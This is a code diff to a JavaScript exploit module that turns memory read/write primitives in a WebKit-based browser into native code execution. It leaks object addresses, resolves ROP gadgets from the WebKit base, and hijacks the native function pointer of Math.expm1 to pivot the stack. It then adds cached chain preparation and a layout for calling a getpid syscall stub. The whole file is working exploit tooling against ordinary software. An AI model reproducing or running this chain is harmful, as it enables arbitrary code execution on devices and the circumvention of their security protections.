@@ -14,6 +14,7 @@ export const SYS = {
 };
 
 const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
+const STACK_SIZE = 0x1000;
 
 const GADGET_TABLE = [
     ["POP_RDI_RET", "wk_POP_RDI_RET", [0x5f, 0xc3]],
@@ -139,6 +140,70 @@ function put(dv, at, v) {
     }
 }
 
+function buildCtx(p, off, G, keepAlive) {
+    const pivotSp = off.pivot_view_sp;
+    const PB_SIZE = Math.max(0x28, (pivotSp + 8 + 0xf) & ~0xf);
+    const sb = new ArrayBuffer(0x20);
+    const pb = new ArrayBuffer(PB_SIZE);
+    const kb = new ArrayBuffer(STACK_SIZE);
+    const fb = new ArrayBuffer(0x40);
+    keepAlive.push(sb, pb, kb, fb);
+    const c = {
+        storeDv: new DataView(sb),
+        pivotDv: new DataView(pb),
+        stackDv: new DataView(kb),
+        frameDv: new DataView(fb),
+        stackU8: new Uint8Array(kb),
+        frameU8: new Uint8Array(fb),
+        stackSize: STACK_SIZE,
+    };
+    c.S = bufAddr(p, off, sb);
+    c.P = bufAddr(p, off, pb);
+    c.K = bufAddr(p, off, kb);
+    c.F = bufAddr(p, off, fb);
+    put(c.storeDv, 0x00, G.G1);
+    put(c.storeDv, 0x08, c.P);
+    put(c.storeDv, 0x10, G.G3);
+    put(c.storeDv, 0x18, G.G2);
+    put(c.pivotDv, 0x00, c.P);
+    put(c.pivotDv, 0x10, G.G5);
+    put(c.pivotDv, 0x20, G.G4);
+    return c;
+}
+
+/**
+ * Cache ROP buffers + expm1 pivot handles while memory is fresh (Save bases).
+ * getpid later only write8+layout+expm1 — no leakval/makeCtx.
+ */
+export function prepNativeChain(p, off, webkitBase) {
+    if (!p || !off || !webkitBase)
+        throw new Error("prepNativeChain: need p, off, webkitBase");
+    const resolved = resolveGadgetsTrust(webkitBase, off);
+    const G = resolved.G;
+    if (!G || resolved.bad.length)
+        throw new Error("prepNativeChain: gadget-bad " + resolved.bad.join(","));
+    const keepAlive = [];
+    const M = buildCtx(p, off, G, keepAlive);
+    const cell = p.leakval(Math.expm1);
+    const mainMf = p.read8(p.read8(cell.add32(0x18))
+        .add32(off.wk_JSFunction_m_function || 0x28));
+    const mainOrig = p.read8(mainMf);
+    const pivotObj = {};
+    keepAlive.push(pivotObj);
+    const pivotCell = p.leakval(pivotObj);
+    return {
+        M,
+        G,
+        mainMf,
+        mainOrig,
+        pivotCell,
+        pivotObj,
+        keepAlive,
+        webkitBase,
+        pivotSp: off.pivot_view_sp,
+    };
+}
+
 /**
  * @param {object} p window.p
  * @param {object} off offset table
@@ -150,6 +215,7 @@ export function initNativeCall(p, off, opts) {
     const trustGadgets = opts.trustGadgets === true || opts.trust === true;
     const trustStubs = opts.trustStubs === true;
     const noStubScan = opts.noStubScan === true;
+    const prep = opts.prep || null;
 
     let webkitBase = opts.webkitBase || null;
     if (!webkitBase && opts.nativeFn && off.wk_expm1_builtin)
@@ -185,9 +251,9 @@ export function initNativeCall(p, off, opts) {
     const resolved = trustGadgets
         ? resolveGadgetsTrust(webkitBase, off)
         : resolveGadgets(p, webkitBase, off);
-    const G = resolved.G;
-    if (!G || resolved.bad.length)
-        throw new Error("gadget-bad: " + (resolved.bad || ["?"]).join(","));
+    const G = prep && prep.G ? prep.G : resolved.G;
+    if (!G || resolved.bad && resolved.bad.length)
+        throw new Error("gadget-bad: " + ((resolved.bad || ["?"]).join(",")));
 
     const stubOpts = {
         trustStubs,
@@ -204,8 +270,7 @@ export function initNativeCall(p, off, opts) {
     const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
         G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];
     const pivotSp = off.pivot_view_sp;
-    const PB_SIZE = Math.max(0x28, (pivotSp + 8 + 0xf) & ~0xf);
-    const keepAlive = [];
+    const keepAlive = prep && prep.keepAlive ? prep.keepAlive : [];
 
     let M = null;
     let mainMf = null;
@@ -215,31 +280,7 @@ export function initNativeCall(p, off, opts) {
     let armed = false;
 
     function makeCtx() {
-        const sb = new ArrayBuffer(0x20);
-        const pb = new ArrayBuffer(PB_SIZE);
-        const kb = new ArrayBuffer(0x2000);
-        const fb = new ArrayBuffer(0x40);
-        keepAlive.push(sb, pb, kb, fb);
-        const c = {
-            storeDv: new DataView(sb),
-            pivotDv: new DataView(pb),
-            stackDv: new DataView(kb),
-            frameDv: new DataView(fb),
-            stackU8: new Uint8Array(kb),
-            frameU8: new Uint8Array(fb),
-        };
-        c.S = bufAddr(p, off, sb);
-        c.P = bufAddr(p, off, pb);
-        c.K = bufAddr(p, off, kb);
-        c.F = bufAddr(p, off, fb);
-        put(c.storeDv, 0x00, G.G1);
-        put(c.storeDv, 0x08, c.P);
-        put(c.storeDv, 0x10, G.G3);
-        put(c.storeDv, 0x18, G.G2);
-        put(c.pivotDv, 0x00, c.P);
-        put(c.pivotDv, 0x10, G.G5);
-        put(c.pivotDv, 0x20, G.G4);
-        return c;
+        return buildCtx(p, off, G, keepAlive);
     }
 
     function layout(c, target, args) {
@@ -258,30 +299,59 @@ export function initNativeCall(p, off, opts) {
         insts.push(G.POP_RAX_RET);
         insts.push(JSVALUE_UNDEFINED);
         insts.push(G.LEAVE_RET);
-        let at = 0x2000 - 8 * insts.length;
+        const stackSize = c.stackSize || STACK_SIZE;
+        let at = stackSize - 8 * insts.length;
         if (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
         for (let i = 0; i < insts.length; i++)
             put(c.stackDv, at + 8 * i, insts[i]);
         put(c.pivotDv, pivotSp, c.K.add32(at));
     }
 
+    function layoutGetpid(c, stub) {
+        c.stackU8.fill(0);
+        c.frameU8.fill(0);
+        const stackSize = c.stackSize || STACK_SIZE;
+        let at = stackSize - 0x38;
+        put(c.stackDv, at + 0x00, stub);
+        put(c.stackDv, at + 0x08, G.POP_RDI_RET);
+        put(c.stackDv, at + 0x10, c.F);
+        put(c.stackDv, at + 0x18, G.MOV_RDI_RAX_RET);
+        put(c.stackDv, at + 0x20, G.POP_RAX_RET);
+        put(c.stackDv, at + 0x28, JSVALUE_UNDEFINED);
+        put(c.stackDv, at + 0x30, G.LEAVE_RET);
+        put(c.pivotDv, pivotSp, c.K.add32(at));
+    }
+
     function arm() {
         if (armed) return;
-        M = makeCtx();
-        const cell = p.leakval(Math.expm1);
-        mainMf = p.read8(p.read8(cell.add32(0x18)).add32(off.wk_JSFunction_m_function));
-        mainOrig = p.read8(mainMf);
-        pivotObj = {};
-        keepAlive.push(pivotObj);
-        pivotCell = p.leakval(pivotObj);
+        if (prep && prep.M) {
+            M = prep.M;
+            mainMf = prep.mainMf;
+            mainOrig = prep.mainOrig;
+            pivotCell = prep.pivotCell;
+            pivotObj = prep.pivotObj;
+            log("NATIVE-ARM", "prep cache");
+        } else {
+            M = makeCtx();
+            const cell = p.leakval(Math.expm1);
+            mainMf = p.read8(p.read8(cell.add32(0x18))
+                .add32(off.wk_JSFunction_m_function || 0x28));
+            mainOrig = p.read8(mainMf);
+            pivotObj = {};
+            keepAlive.push(pivotObj);
+            pivotCell = p.leakval(pivotObj);
+            log("NATIVE-ARM", "fresh");
+        }
         p.write8(mainMf, G.G0);
         armed = true;
-        log("NATIVE-ARM", "pivot armed");
     }
 
     function callAddr(target, args) {
         arm();
-        layout(M, target, args || []);
+        if (!args || !args.length)
+            layoutGetpid(M, target);
+        else
+            layout(M, target, args);
         const saved = p.read8(pivotCell);
         p.write8(pivotCell, M.S);
         Math.expm1(pivotObj);
